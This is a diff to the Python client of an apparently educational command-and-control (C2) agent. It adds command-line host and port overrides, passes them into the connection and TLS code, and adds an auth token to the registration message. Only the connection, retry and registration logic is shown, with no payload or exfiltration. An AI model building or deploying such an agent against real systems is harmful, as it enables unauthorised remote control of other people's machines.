@@ -24,26 +24,88 @@ from typing import Optional, Tuple
 from common import config, protocol
 
 
-def display_banner():
+def parse_arguments() -> Tuple[str, int]:
+    """
+    Parse command-line arguments for server connection details.
+
+    Supports two modes:
+    1. No arguments: Use config.py defaults (localhost:4444)
+    2. Two arguments: Override with custom host and port
+
+    Usage:
+        python client.py                    # Use config defaults
+        python client.py <host> <port>      # Override with command-line args
+
+    Returns:
+        tuple: (server_host, server_port)
+
+    Examples:
+        python client.py
+        python client.py 127.0.0.1 4444
+        python client.py 192.168.1.100 8080
+    """
+    if len(sys.argv) == 3:
+        # User provided host and port
+        server_host = sys.argv[1]
+        try:
+            server_port = int(sys.argv[2])
+        except ValueError:
+            print(f"[!] ERROR: Port must be a number, got: {sys.argv[2]}")
+            print()
+            print("Usage: python client.py [server_host] [server_port]")
+            sys.exit(1)
+
+        print(f"[*] Using command-line arguments: {server_host}:{server_port}")
+        print()
+
+    elif len(sys.argv) == 1:
+        # No arguments, use config defaults
+        server_host = config.SERVER_HOST
+        server_port = config.SERVER_PORT
+        print(f"[*] Using config defaults: {server_host}:{server_port}")
+        print()
+
+    else:
+        # Invalid number of arguments
+        print("Usage: python client.py [server_host] [server_port]")
+        print()
+        print("Examples:")
+        print("  python client.py                    # Use config.py defaults")
+        print("  python client.py 127.0.0.1 4444     # Connect to specific server")
+        print("  python client.py 192.168.1.100 8080 # Connect to remote server")
+        sys.exit(1)
+
+    return server_host, server_port
+
+
+def display_banner(server_host: str, server_port: int):
     """
     Display the client startup banner with configuration info.
+
+    Args:
+        server_host: The C2 server hostname/IP to connect to
+        server_port: The C2 server port to connect to
     """
     print("=" * 60)
     print("C2 CLIENT - Command and Control Agent")
     print("=" * 60)
-    print(f"Target Server: {config.SERVER_HOST}:{config.SERVER_PORT}")
+    print(f"Target Server: {server_host}:{server_port}")
     print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print(f"Client ID: {socket.gethostname()}")
     print("=" * 60)
     print()
 
 
-def connect_to_server() -> Optional[socket.socket]:
+def connect_to_server(server_host: str, server_port: int) -> Optional[socket.socket]:
     """
     Connect to the C2 server with retry logic.
 
     Attempts to establish a TCP connection to the server.
     Will retry multiple times with exponential backoff on failure.
+
+    Args:
+        server_host: The C2 server hostname/IP to connect to
+        server_port: The C2 server port to connect to
 
     Returns:
         socket.socket: Connected socket if successful
@@ -54,7 +116,7 @@ def connect_to_server() -> Optional[socket.socket]:
 
     while retry_count <= config.MAX_CONNECTION_RETRIES:
         try:
-            print(f"[*] Attempting to connect to {config.SERVER_HOST}:{config.SERVER_PORT}...")
+            print(f"[*] Attempting to connect to {server_host}:{server_port}...")
 
             # Create TCP socket
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -62,7 +124,7 @@ def connect_to_server() -> Optional[socket.socket]:
 
             if config.TLS_ENABLED:
                 print("[*] TLS enabled. Wrapping socket...")
-                
+
                 # Create an SSL context
                 # We tell it to trust the server's certificate (TLS_CERTFILE)
                 ssl_context = ssl.create_default_context(
@@ -72,13 +134,13 @@ def connect_to_server() -> Optional[socket.socket]:
                 # Wrap the socket before connecting
                 client_socket = ssl_context.wrap_socket(
                     client_socket,
-                    server_hostname=config.SERVER_HOST
+                    server_hostname=server_host
                 )
 
             # Attempt connection (on the wrapped socket if TLS is on)
-            client_socket.connect((config.SERVER_HOST, config.SERVER_PORT))
+            client_socket.connect((server_host, server_port))
 
-            print(f"[+] Connected successfully to {config.SERVER_HOST}:{config.SERVER_PORT}")
+            print(f"[+] Connected successfully to {server_host}:{server_port}")
             if config.TLS_ENABLED:
                 print(f"[*] TLS Cipher: {client_socket.cipher()[0]}")
             print()
@@ -97,7 +159,7 @@ def connect_to_server() -> Optional[socket.socket]:
             return None
             
         except socket.gaierror:
-            print(f"[!] ERROR: Cannot resolve hostname {config.SERVER_HOST}")
+            print(f"[!] ERROR: Cannot resolve hostname {server_host}")
             return None
         
         except OSError as e:
@@ -139,7 +201,8 @@ def send_registration(client_socket: socket.socket) -> bool:
         registration_message = {
             'type': 'registration',
             'client_id': client_id,
-            'timestamp': datetime.now().isoformat()
+            'timestamp': datetime.now().isoformat(),
+            'auth_token': config.AUTH_TOKEN  # Authentication token
         }
 
         print(f"[*] Sending registration as: {client_id}")
@@ -310,12 +373,16 @@ def main():
     Main entry point for the C2 client.
 
     Orchestrates the client connection, registration, and command loop.
+    Supports command-line arguments for flexible server configuration.
     """
+    # Parse command-line arguments (or use config defaults)
+    server_host, server_port = parse_arguments()
+
     # Display banner
-    display_banner()
+    display_banner(server_host, server_port)
 
     # Connect to server
-    client_socket = connect_to_server()
+    client_socket = connect_to_server(server_host, server_port)
 
     if client_socket is None:
         print("[!] Failed to connect to server. Exiting.")
